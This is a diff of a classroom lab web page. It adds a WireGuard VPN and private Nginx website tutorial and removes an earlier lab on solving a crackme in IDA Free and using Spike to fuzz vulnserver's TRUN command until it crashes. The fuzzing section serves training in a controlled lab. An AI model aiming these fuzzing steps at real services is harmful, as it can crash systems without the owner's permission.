@@ -1,584 +1,742 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Reverse Engineering and Fuzzing Lab</title>
-  <style>
-    :root {
-      --bg: #f6f8fb;
-      --card: #ffffff;
-      --text: #1f2937;
-      --muted: #6b7280;
-      --primary: #2563eb;
-      --primary-dark: #1e40af;
-      --accent: #10b981;
-      --warning: #f59e0b;
-      --danger: #ef4444;
-      --code-bg: #111827;
-      --code-text: #e5e7eb;
-      --border: #e5e7eb;
-    }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>3-Hour VPN Tutorial: Server VM, Client VM and Private Website</title>
+    <style>
+        :root {
+            --bg: #f5f7fb;
+            --card: #fff;
+            --text: #172033;
+            --muted: #5f6b7a;
+            --primary: #2563eb;
+            --accent: #0f766e;
+            --danger: #b91c1c;
+            --warning: #b45309;
+            --border: #d8e0ea;
+            --soft: #eaf1ff;
+            --green: #e8f7ef;
+            --yellow: #fff7e6;
+            --red: #fff1f2;
+            --code: #0f172a;
+            --codeText: #e5e7eb;
+            --shadow: 0 10px 28px rgba(15, 23, 42, .08);
+        }
 
-    * {
-      box-sizing: border-box;
-    }
+        * {
+            box-sizing: border-box
+        }
 
-    body {
-      margin: 0;
-      font-family: Arial, Helvetica, sans-serif;
-      line-height: 1.6;
-      background: var(--bg);
-      color: var(--text);
-    }
+        body {
+            margin: 0;
+            font-family: Inter, Segoe UI, Roboto, Arial, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.65
+        }
 
-    header {
-      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-      color: white;
-      padding: 48px 24px;
-      text-align: center;
-    }
+        header {
+            padding: 56px 24px;
+            text-align: center;
+            color: white;
+            background: linear-gradient(135deg, #2563eb, #0f766e)
+        }
 
-    header h1 {
-      margin: 0 0 12px;
-      font-size: 2.3rem;
-      letter-spacing: -0.03em;
-    }
+        header h1 {
+            max-width: 1050px;
+            margin: 0 auto 14px;
+            font-size: clamp(2rem, 4vw, 3.5rem);
+            line-height: 1.08;
+            letter-spacing: -.04em
+        }
 
-    header p {
-      margin: 0 auto;
-      max-width: 850px;
-      color: #dbeafe;
-      font-size: 1.05rem;
-    }
+        header p {
+            max-width: 880px;
+            margin: 0 auto;
+            color: rgba(255, 255, 255, .92);
+            font-size: 1.1rem
+        }
 
-    .container {
-      max-width: 1100px;
-      margin: 0 auto;
-      padding: 32px 20px 64px;
-    }
+        .page {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 24px;
+            display: grid;
+            grid-template-columns: 280px 1fr;
+            gap: 24px
+        }
 
-    .note {
-      background: #eff6ff;
-      border-left: 5px solid var(--primary);
-      padding: 16px 18px;
-      border-radius: 10px;
-      margin-bottom: 28px;
-    }
+        aside {
+            position: sticky;
+            top: 20px;
+            align-self: start;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 18px;
+            box-shadow: var(--shadow);
+            padding: 18px;
+            max-height: calc(100vh - 40px);
+            overflow: auto
+        }
 
-    .note strong {
-      color: var(--primary-dark);
-    }
+        aside h2 {
+            font-size: .9rem;
+            text-transform: uppercase;
+            letter-spacing: .08em;
+            color: var(--muted);
+            margin: 0 0 10px
+        }
 
-    .toc {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 16px;
-      padding: 22px;
-      margin-bottom: 32px;
-      box-shadow: 0 8px 20px rgba(15, 23, 42, 0.06);
-    }
+        aside a {
+            display: block;
+            text-decoration: none;
+            color: var(--text);
+            padding: 8px 10px;
+            border-radius: 10px;
+            font-size: .94rem
+        }
 
-    .toc h2 {
-      margin-top: 0;
-      font-size: 1.25rem;
-    }
+        aside a:hover {
+            background: var(--soft);
+            color: #1d4ed8
+        }
 
-    .toc ul {
-      margin: 0;
-      padding-left: 22px;
-    }
+        main {
+            min-width: 0
+        }
 
-    .toc a {
-      color: var(--primary-dark);
-      text-decoration: none;
-      font-weight: 600;
-    }
+        section {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 18px;
+            box-shadow: var(--shadow);
+            padding: 28px;
+            margin-bottom: 24px
+        }
 
-    .toc a:hover {
-      text-decoration: underline;
-    }
+        h2 {
+            margin-top: 0;
+            font-size: 1.75rem;
+            letter-spacing: -.03em
+        }
 
-    section.question {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 18px;
-      padding: 28px;
-      margin-bottom: 36px;
-      box-shadow: 0 10px 24px rgba(15, 23, 42, 0.07);
-    }
+        h3 {
+            margin-top: 26px;
+            font-size: 1.22rem
+        }
 
-    section.question > h2 {
-      margin-top: 0;
-      padding-bottom: 12px;
-      border-bottom: 2px solid var(--border);
-      color: var(--primary-dark);
-      font-size: 1.75rem;
-    }
+        p {
+            margin-top: 0
+        }
 
-    article.step {
-      margin: 28px 0;
-      padding: 20px;
-      border: 1px solid var(--border);
-      border-radius: 14px;
-      background: #fbfdff;
-    }
+        .lead {
+            font-size: 1.08rem;
+            color: #334155
+        }
 
-    article.step h3 {
-      margin-top: 0;
-      color: #111827;
-      font-size: 1.22rem;
-    }
+        .badge {
+            display: inline-block;
+            border-radius: 999px;
+            padding: 5px 10px;
+            font-size: .82rem;
+            font-weight: 700;
+            background: var(--soft);
+            color: #1d4ed8;
+            margin-bottom: 10px
+        }
 
-    .tag {
-      display: inline-block;
-      padding: 4px 10px;
-      border-radius: 999px;
-      background: #dbeafe;
-      color: var(--primary-dark);
-      font-size: 0.78rem;
-      font-weight: 700;
-      margin-right: 8px;
-      text-transform: uppercase;
-      letter-spacing: 0.04em;
-    }
+        .grid {
+            display: grid;
+            gap: 16px
+        }
 
-    .screenshot {
-      background: #fff7ed;
-      border-left: 5px solid var(--warning);
-      padding: 12px 14px;
-      border-radius: 10px;
-      margin-top: 14px;
-      font-weight: 600;
-    }
+        .grid3 {
+            grid-template-columns: repeat(3, minmax(0, 1fr))
+        }
 
-    .optional {
-      background: #f0fdf4;
-      border-left: 5px solid var(--accent);
-      padding: 12px 14px;
-      border-radius: 10px;
-      margin-top: 14px;
-      font-weight: 600;
-    }
+        .grid2 {
+            grid-template-columns: repeat(2, minmax(0, 1fr))
+        }
 
-    code.inline-code {
-      background: #eef2ff;
-      color: #3730a3;
-      padding: 2px 6px;
-      border-radius: 6px;
-      font-family: Consolas, Monaco, 'Courier New', monospace;
-      font-size: 0.95em;
-    }
+        .card {
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 18px;
+            background: #fff
+        }
 
-    pre {
-      background: var(--code-bg);
-      color: var(--code-text);
-      padding: 16px 18px;
-      border-radius: 12px;
-      overflow-x: auto;
-      margin: 14px 0;
-      border: 1px solid #374151;
-    }
+        .card h3 {
+            margin-top: 0
+        }
 
-    pre code {
-      font-family: Consolas, Monaco, 'Courier New', monospace;
-      font-size: 0.95rem;
-      line-height: 1.55;
-    }
+        .note,
+        .teacher,
+        .warning,
+        .danger {
+            border-radius: 14px;
+            padding: 16px 18px;
+            margin: 16px 0;
+            border-left: 5px solid
+        }
 
-    .file-list {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-      gap: 12px;
-      margin: 14px 0;
-    }
+        .note {
+            background: var(--soft);
+            border-color: var(--primary)
+        }
 
-    .file-item {
-      background: #f9fafb;
-      border: 1px solid var(--border);
-      border-radius: 10px;
-      padding: 12px;
-      font-family: Consolas, Monaco, 'Courier New', monospace;
-      font-weight: 700;
-      color: #374151;
-    }
+        .teacher {
+            background: var(--green);
+            border-color: var(--accent)
+        }
 
-    .warning-box {
-      background: #fef2f2;
-      border-left: 5px solid var(--danger);
-      padding: 16px 18px;
-      border-radius: 10px;
-      margin: 22px 0;
-    }
+        .warning {
+            background: var(--yellow);
+            border-color: var(--warning)
+        }
 
-    .warning-box strong {
-      color: #991b1b;
-    }
+        .danger {
+            background: var(--red);
+            border-color: var(--danger)
+        }
 
-    footer {
-      text-align: center;
-      color: var(--muted);
-      padding: 24px;
-      font-size: 0.92rem;
-    }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 14px 0 20px;
+            border-radius: 14px;
+            overflow: hidden
+        }
 
-    @media print {
-      body {
-        background: white;
-      }
+        th,
+        td {
+            border: 1px solid var(--border);
+            padding: 12px;
+            text-align: left;
+            vertical-align: top
+        }
 
-      header {
-        background: white;
-        color: black;
-        border-bottom: 2px solid #000;
-      }
+        th {
+            background: #eef4ff;
+            color: #1e3a8a
+        }
 
-      header p {
-        color: black;
-      }
+        code {
+            font-family: SFMono-Regular, Consolas, Liberation Mono, monospace
+        }
 
-      section.question,
-      .toc,
-      article.step {
-        box-shadow: none;
-        break-inside: avoid;
-      }
+        p code,
+        li code,
+        td code {
+            background: #eef2ff;
+            color: #1e3a8a;
+            padding: 2px 6px;
+            border-radius: 7px;
+            font-size: .92em
+        }
 
-      pre {
-        white-space: pre-wrap;
-        word-break: break-word;
-      }
-    }
-  </style>
+        .code-wrap {
+            position: relative;
+            margin: 14px 0
+        }
+
+        pre {
+            margin: 0;
+            background: var(--code);
+            color: var(--codeText);
+            border-radius: 14px;
+            padding: 18px;
+            overflow: auto;
+            border: 1px solid #1e293b;
+            font-size: .93rem;
+            line-height: 1.55
+        }
+
+        .copy-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background: #334155;
+            color: white;
+            border: 0;
+            border-radius: 9px;
+            padding: 6px 10px;
+            cursor: pointer;
+            font-size: .78rem
+        }
+
+        .copy-btn:hover {
+            background: #475569
+        }
+
+        .topology {
+            background: #0f172a;
+            color: #e2e8f0;
+            border-radius: 18px;
+            padding: 20px;
+            overflow: auto;
+            border: 1px solid #1e293b
+        }
+
+        .topology pre {
+            border: 0;
+            padding: 0;
+            background: transparent
+        }
+
+        .blue {
+            color: #93c5fd;
+            font-weight: 700
+        }
+
+        .green {
+            color: #86efac;
+            font-weight: 700
+        }
+
+        .red {
+            color: #fca5a5;
+            font-weight: 700
+        }
+
+        .yellow {
+            color: #fde68a;
+            font-weight: 700
+        }
+
+        .timeline {
+            display: grid;
+            gap: 12px
+        }
+
+        .time-row {
+            display: grid;
+            grid-template-columns: 120px 1fr;
+            gap: 14px;
+            padding: 14px;
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            background: #fbfdff
+        }
+
+        .time-row strong:first-child {
+            color: #1d4ed8
+        }
+
+        .checklist {
+            list-style: none;
+            padding-left: 0
+        }
+
+        .checklist li {
+            position: relative;
+            padding: 8px 0 8px 32px
+        }
+
+        .checklist li:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            top: 8px;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            display: grid;
+            place-items: center;
+            background: var(--green);
+            color: var(--accent);
+            font-weight: 800;
+            font-size: .8rem
+        }
+
+        .footer {
+            text-align: center;
+            color: var(--muted);
+            padding: 28px 16px 60px
+        }
+
+        @media(max-width:960px) {
+            .page {
+                grid-template-columns: 1fr
+            }
+
+            .grid2,
+            .grid3 {
+                grid-template-columns: 1fr
+            }
+
+            aside {
+                position: static;
+                max-height: none
+            }
+
+            .time-row {
+                grid-template-columns: 1fr
+            }
+        }
+
+        @media print {
+            body {
+                background: #fff
+            }
+
+            header {
+                background: #fff;
+                color: #000;
+                border-bottom: 2px solid #ddd
+            }
+
+            aside,
+            .copy-btn {
+                display: none
+            }
+
+            .page {
+                display: block;
+                padding: 0
+            }
+
+            section {
+                box-shadow: none;
+                break-inside: avoid
+            }
+        }
+    </style>
 </head>
+
 <body>
-  
-  <main class="container">
-    <div class="warning-box">
-        <strong>Important:</strong> Below the questions, please answer them in a Word file. After the lesson, I will send you the submission link. Rename the file look like: fullname_lab2_code. Please submit <strong>pdf file</strong>
-      </div>
-    <section id="question-1" class="question">
-      <h2>Question 1: Performing Reverse Engineering with IDA Free</h2>
+    <div class="page">
+        <aside>
+            <h2>Contents</h2>
+            <a href="#prepare">1. Prepare VMs</a><a href="#install">2. Install WireGuard</a><a href="#keys">3. Generate
+                Keys</a><a href="#server">4. Server Config</a><a href="#client">5. Client Config</a><a
+                href="#testvpn">6. Start and Test VPN</a><a href="#website">7. Private Website</a><a href="#nonvpn">8.
+                Non-VPN Test</a><a href="#review">Review Questions</a>
+        </aside>
+        <main>
+            <div class="teacher"><strong>Highlight note:</strong> Before the step 1, you need to make sure that there are 3 VMs on your local machine, including: 1 original VM, 2 clone (VPN-server, VPN-client). This setup should be supported by your teacher.</div>
+            <section id="prepare">
+                <h2>Step 1: Prepare the Three VMs</h2>
+                <p>Create three Kali Linux VMs: <code>vpn-server</code> - <code>vpn-client</code> and
+                    <code>normal-client</code>.</p>
+                <table>
+                    <tr>
+                        <th>Adapter</th>
+                        <th>Setting</th>
+                        <th>Purpose</th>
+                    </tr>
+                    <tr>
+                        <td>Adapter 1</td>
+                        <td>NAT</td>
+                        <td>Internet access for installing packages.</td>
+                    </tr>
+                    <tr>
+                        <td>Adapter 2</td>
+                        <td>Host-only Network</td>
+                        <td>Communication between server and client VM.</td>
+                    </tr>
+                </table>
+                <h3>Check network interfaces</h3>
+                Check this with all VMs
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>ip -br a</code></pre>
+                </div>
+                <p>Example output:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>lo        UNKNOWN  127.0.0.1/8
+eth0    UP       10.0.2.15/24
+eth1    UP</code></pre>
+                </div>
+                <div class="teacher"><strong>Highlight note:</strong> In many VirtualBox setups, <code>eth0</code> is
+                    NAT and <code>eth1</code> is host-only/internal. Your interface name and ip addresses may be different.</div>
+                <h3>Assign normal lab IPs</h3>
+                </code></pre>
+                <p>On the VPN Server VM:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo ip addr add 192.168.56.10/24 dev eth1
+sudo ip link set eth1 up</code></pre>
+                </div>
+                <p>On the VPN Client VM:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo ip addr add 192.168.56.20/24 dev eth1
+sudo ip link set eth1 up</code></pre>
+                </div>
+                <p>On the Normal Client VM:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo ip addr add 192.168.56.30/24 dev eth1
+sudo ip link set eth1 up</code></pre>
+                </div>
+                <p>From the client VMs, test normal connectivity:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>ping -c 3 192.168.56.10</code></pre>
+                </div>
+                <div class="warning"><strong>Important:</strong> Do not continue until the clients can ping
+                    <code>192.168.56.10</code>. If this fails, the normal VM network is not working.</div>
+            </section>
+            <section id="install">
+                <h2>Step 2: Install WireGuard on Two VPN VMs (Server and Client)</h2>
+                <p>Run this on both server and client:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo apt update</code></pre>
+                When it's done, run this.
+                <pre><code>sudo apt install wireguard -y</code></pre>
+                </div>
+            </section>
+            <section id="keys">
+                <h2>Step 3: Generate WireGuard Keys</h2>
+                <p>Each peer has a private key and public key. The private key stays on the machine. The public key is
+                    shared with the other peer.</p>
+                <div class="danger"><strong>Security reminder:</strong> Never share private keys publicly or commit them
+                    to GitHub.</div>
+                <h3>On VPN Server VM</h3>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo -i
+cd /etc/wireguard
+umask 077
+wg genkey | tee server_private.key | wg pubkey &gt; server_public.key
+cat server_public.key
+exit</code></pre>
+                </div>
+                <p>Display server private key when needed:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo cat /etc/wireguard/server_private.key</code></pre>
+                </div>
+                <h3>On VPN Client VM</h3>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo -i
+cd /etc/wireguard
+umask 077
+wg genkey | tee client_private.key | wg pubkey &gt; client_public.key
+cat client_public.key
+exit</code></pre>
+                </div>
+                <p>Display client private key when needed:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo cat /etc/wireguard/client_private.key</code></pre>
+                </div>
+            </section>
+            <section id="server">
+                <h2>Step 4: Configure the VPN Server</h2>
+                <p>On the server VM:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo nano /etc/wireguard/wg0.conf</code></pre>
+                </div>
+                <p>Add this:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>[Interface]
+Address = 10.10.0.1/24
+ListenPort = 51820
+PrivateKey = SERVER_PRIVATE_KEY_HERE
 
-      <article class="step">
-        <h3><span class="tag">Step 1.1</span>Install IDA Free on Kali Linux</h3>
-        <p>Download the IDA Free installer file from <a href="https://hex-rays.com/ida-free">https://hex-rays.com/ida-free</a> request it with your email to get a free licence.</p>
-        <p>Rename the downloaded file to <i>idafree.run</i></p>
-        <p>Grant execution permission:</p>
-        <pre><code>sudo chmod +x ./Downloads/idafree.run</code></pre>
-        <p>Run the installer:</p>
-        <pre><code>./Downloads/idafree.run</code></pre>
-        <p>Follow the installation instructions. IDA Free will be installed in the user's home directory.</p>
-      </article>
+[Peer]
+PublicKey = CLIENT_PUBLIC_KEY_HERE
+AllowedIPs = 10.10.0.2/32</code></pre>
+                </div>
+                <ul>
+                    <li><code>SERVER_PRIVATE_KEY_HERE</code> = content of server private key.</li>
+                    <li><code>CLIENT_PUBLIC_KEY_HERE</code> = public key from client VM.</li>
+                </ul>
+                <div class="teacher"><strong>Explanation</strong> The server listens on UDP port
+                    <code>51820</code> and allows the client peer to use VPN IP <code>10.10.0.2</code>.</div>
+            </section>
+            <section id="client">
+                <h2>Step 5: Configure the VPN Client</h2>
+                <p>On the client VM:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo nano /etc/wireguard/wg0.conf</code></pre>
+                </div>
+                <p>Add this:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>[Interface]
+Address = 10.10.0.2/24
+PrivateKey = CLIENT_PRIVATE_KEY_HERE
 
-      <article class="step">
-        <h3><span class="tag">Step 1.2</span>Run the crackme Program on Kali</h3>
-        <p>Go to the <a href="https://crackmes.one/crackme/5eae2d6633c5d47611746500">Crackme</a> site, download and unzip it with the password:</p>
-        <pre><code>crackmes.one</code></pre>
-        <p>After extraction, you will get a zip file named <code class="inline-code">easyAF</code> , unzip it again, the executable file you will get named </p>
-        <div class="file-list">
-          <div class="file-item">easyAF</div>
-        </div>
-        <p>Run <code class="inline-code">easyAF</code> in the Linux CMD environment</p>
-        First, you need to check where the file is stored. Go to that folder and run
-        <pre><code>./easyAF</code></pre>
-        <p>Enter to run. It will ask you the password. Just type anything you want because you don't know the password right now.</p>
-        What did you get?
-      </article>
+[Peer]
+PublicKey = SERVER_PUBLIC_KEY_HERE
+Endpoint = 192.168.56.10:51820
+AllowedIPs = 10.10.0.0/24
+PersistentKeepalive = 25</code></pre>
+                </div>
+                <ul>
+                    <li><code>CLIENT_PRIVATE_KEY_HERE</code> = content of client private key.</li>
+                    <li><code>SERVER_PUBLIC_KEY_HERE</code> = public key from server VM.</li>
+                </ul>
+                <div class="teacher"><strong>Explanation:</strong> <code>Endpoint</code> tells the client where
+                    the server is on the normal network. <code>AllowedIPs</code> tells the client which destination
+                    traffic should go through the VPN tunnel.</div>
+            </section>
+            <section id="testvpn">
+                <h2>Step 6: Start and Test the VPN</h2>
+                <p>Start VPN on the server:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo wg-quick up wg0</code></pre>
+                </div>
+                <p>Start VPN on the client:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo wg-quick up wg0</code></pre>
+                </div>
+                <p>Check the VPN interface on both VMs:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>ip addr show wg0</code></pre>
+                </div>
+                <p>From the client VM:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>ping -c 3 10.10.0.1</code></pre>
+                </div>
+                <p>From the server VM:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>ping -c 3 10.10.0.2</code></pre>
+                </div>
+                <p>Check VPN status:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo wg</code></pre>
+                </div>
+                <p>Look for <code>latest handshake</code> and transfer data.</p>
+                <h3>Useful commands</h3>
+                <table>
+                    <tr>
+                        <th>Action</th>
+                        <th>Command</th>
+                    </tr>
+                    <tr>
+                        <td>Stop VPN</td>
+                        <td><code>sudo wg-quick down wg0</code></td>
+                    </tr>
+                    <tr>
+                        <td>Start VPN</td>
+                        <td><code>sudo wg-quick up wg0</code></td>
+                    </tr>
+                    <tr>
+                        <td>Show VPN status</td>
+                        <td><code>sudo wg</code></td>
+                    </tr>
+                    <tr>
+                        <td>Show routes</td>
+                        <td><code>ip route</code></td>
+                    </tr>
+                    <tr>
+                        <td>Enable after reboot</td>
+                        <td><code>sudo systemctl enable wg-quick@wg0</code></td>
+                    </tr>
+                </table>
+            </section>
+            <section id="website">
+                <h2>Step 7: Create a Private Website on the VPN Server</h2>
+                <p>The website will listen only on <code>10.10.0.1:8080</code>, not on <code>192.168.56.10:8080</code>.
+                </p>
+                <h3>Install Nginx</h3>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo apt update
+sudo apt install nginx -y</code></pre>
+                </div>
+                <h3>Create website folder and homepage</h3>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo mkdir -p /var/www/private-vpn
+sudo nano /var/www/private-vpn/index.html</code></pre>
+                </div>
+                <p>Add this HTML:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Private VPN Website&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Private VPN Website&lt;/h1&gt;
+    &lt;p&gt;You can see this page because you are connected through the VPN.&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+                </div>
+                <h3>Create Nginx site config</h3>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo nano /etc/nginx/sites-available/private-vpn</code></pre>
+                </div>
+                <p>Add this:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>server {
+    listen 10.10.0.1:8080;
 
-      <article class="step">
-        <h3><span class="tag">Step 1.3</span>Open and search on IDA Free</h3>
-        <p>Open IDA Free on Kali Linux and load the <code class="inline-code">easyAF</code> file.</p>
-        <p>In IDA Free, go to:</p>
-        <pre><code>Search → Text</code></pre>
-        <p>Search for the keyword:</p>
-        <pre><code>password</code></pre>
-        <p>In the <code class="inline-code">IDA - View A</code> window, select:</p>
-        <pre><code>Fit window</code></pre>
-        <p>Use either <code class="inline-code">Text view</code> or <code class="inline-code">Graph view</code> to view the Assembly code of the program.</p>
-      </article>
+    server_name private-vpn.local;
 
-      <article class="step">
-        <h3><span class="tag">Step 1.4</span>Generate Pseudocode</h3>
-        <p>In IDA Free, go to:</p>
-        <pre><code>View → Subviews → Generate pseudocode</code></pre>
-        <p>In the <code class="inline-code">Pseudocode - A</code> window, use <code class="inline-code">Synchronize with</code> to synchronize it with (right-click -> synchronize with -> IDA - View A or IDA - View B):</p>
-        
-      </article>
+    root /var/www/private-vpn;
+    index index.html;
 
-      <article class="step">
-        <h3><span class="tag">Step 1.6</span>Analyze the Pseudocode</h3>
-        <p>Analyze the pseudocode of <code class="inline-code">crackme.exe</code> to determine the correct input that makes the program print the following message:</p>
-        <pre><code>Welldone!</code></pre>
-        <p>Then run <code class="inline-code">easyAF</code> in the Linux CMD environment and make sure the message above is displayed.</p>
-        <div class="screenshot">Take screenshots to demonstrate your results.</div>
-      </article>
+    location / {
+        try_files $uri $uri/ =404;
+    }
+}</code></pre>
+                </div>
+                <div class="note"><strong>Important:</strong> <code>listen 10.10.0.1:8080;</code> means Nginx accepts
+                    website traffic only through the VPN IP address.</div>
+                <h3>Enable and reload</h3>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>sudo ln -s /etc/nginx/sites-available/private-vpn /etc/nginx/sites-enabled/private-vpn
+sudo nginx -t
+sudo systemctl reload nginx</code></pre>
+                </div>
+                <div class="warning"><strong>If Nginx fails:</strong> start WireGuard first because
+                    <code>10.10.0.1</code> exists only after <code>wg0</code> is active. Run
+                    <code>sudo wg-quick up wg0</code>, then test Nginx again.</div>
+                <h3>Test from VPN Client</h3>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>curl http://10.10.0.1:8080</code></pre>
+                </div>
+                <p>Expected result includes:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>&lt;h1&gt;Private VPN Website&lt;/h1&gt;</code></pre>
+                </div>
+            </section>
+            <section id="nonvpn">
+                <h2>Step 8: Test from the Normal Client VM</h2>
+                
+                <p>Try:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>curl http://10.10.0.1:8080</code></pre>
+                </div>
+                <p>Expected result:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>No route to host
+# or
+Connection timed out</code></pre>
+                </div>
+                <p>Also try:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>curl http://192.168.56.10:8080</code></pre>
+                </div>
+                <p>Expected result:</p>
+                <div class="code-wrap"><button class="copy-btn">Copy</button>
+                    <pre><code>Connection refused</code></pre>
+                </div>
+                <div class="teacher"><strong>Explanation:</strong> The website is not listening on the server's
+                    normal IP. It is listening only on the VPN IP. Therefore, a machine must first join the VPN network
+                    before it can reach the website.</div>
+            </section>
 
-      
-
-    <!-- <section id="question-2" class="question">
-      <h2>Question 2: Performing Fuzzing with Spike</h2>
-
-      <div class="warning-box">
-        <strong>Important:</strong> Perform this lab only in a controlled lab environment. Do not run fuzzing activities against systems that you do not own or do not have permission to test.
-      </div>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.1</span>Prepare Netcat on Windows</h3>
-        <p>Install <code class="inline-code">nmap</code>, which includes <code class="inline-code">ncat</code>, on the Windows machine.</p>
-        <p>Turn off the Windows Firewall for this lab environment.</p>
-        <p>Start a Netcat service in Windows CMD:</p>
-        <pre><code>ncat -vklp 9000</code></pre>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.2</span>Configure Kali Linux Networking</h3>
-        <p>Change the network configuration of the Kali Linux virtual machine so that it can communicate with the Windows machine.</p>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.3</span>Create the First Spike Script</h3>
-        <p>On Kali Linux, create a file named:</p>
-        <pre><code>simple1.spk</code></pre>
-        <p>Use the following command:</p>
-        <pre><code>nano simple1.spk</code></pre>
-        <p>Add the following content:</p>
-        <pre><code>s_string("Hello, world!");</code></pre>
-        <p>Save the file.</p>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.4</span>Fuzz the Netcat Service Using simple1.spk</h3>
-        <p>Run the following command on Kali Linux:</p>
-        <pre><code>generic_send_tcp &lt;Windows_IP_Address&gt; 9000 simple1.spk 0 0</code></pre>
-        <p>Observe the result received by the Netcat service on Windows.</p>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.5</span>Create the Second Spike Script</h3>
-        <p>Create another file named:</p>
-        <pre><code>simple2.spk</code></pre>
-        <p>Use the following command:</p>
-        <pre><code>nano simple2.spk</code></pre>
-        <p>Add the following content:</p>
-        <pre><code>s_string_variable("Hello, world!");</code></pre>
-        <p>Save the file.</p>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.6</span>Fuzz the Netcat Service Using simple2.spk</h3>
-        <p>Run the following command:</p>
-        <pre><code>generic_send_tcp &lt;Windows_IP_Address&gt; 9000 simple2.spk 0 0</code></pre>
-        <p>Observe the result received by the Netcat service on Windows.</p>
-        <div class="screenshot">Take screenshots to demonstrate your results.</div>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.7</span>Run vulnserver on Windows</h3>
-        <p>Download and extract:</p>
-        <pre><code>Lab03.zip</code></pre>
-        <p>You will get a folder named:</p>
-        <pre><code>vulnserver</code></pre>
-        <p>Run the following file in Windows CMD:</p>
-        <pre><code>vulnserver.exe</code></pre>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.8</span>Connect to vulnserver from Kali Linux</h3>
-        <p>On Kali Linux, connect to the Windows vulnserver service:</p>
-        <pre><code>nc &lt;Windows_IP_Address&gt; 9999</code></pre>
-        <p>After connecting, test the following commands:</p>
-        <pre><code>HELP
-EXIT</code></pre>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.9</span>Create the TRUN Spike Script</h3>
-        <p>Create a file named:</p>
-        <pre><code>trun.spk</code></pre>
-        <p>Use the following command:</p>
-        <pre><code>nano trun.spk</code></pre>
-        <p>Add the following content:</p>
-        <pre><code>s_readline();
-s_string("TRUN ");
-s_string_variable("COMMAND");</code></pre>
-        <p>Save the file.</p>
-      </article>
-
-      <article class="step">
-        <h3><span class="tag">Step 2.10</span>Fuzz the vulnserver Service</h3>
-        <p>Run the following command on Kali Linux:</p>
-        <pre><code>generic_send_tcp &lt;Windows_IP_Address&gt; 9999 trun.spk 0 0</code></pre>
-        <p>Observe the result. The <code class="inline-code">vulnserver</code> service should stop working after a short period of time.</p>
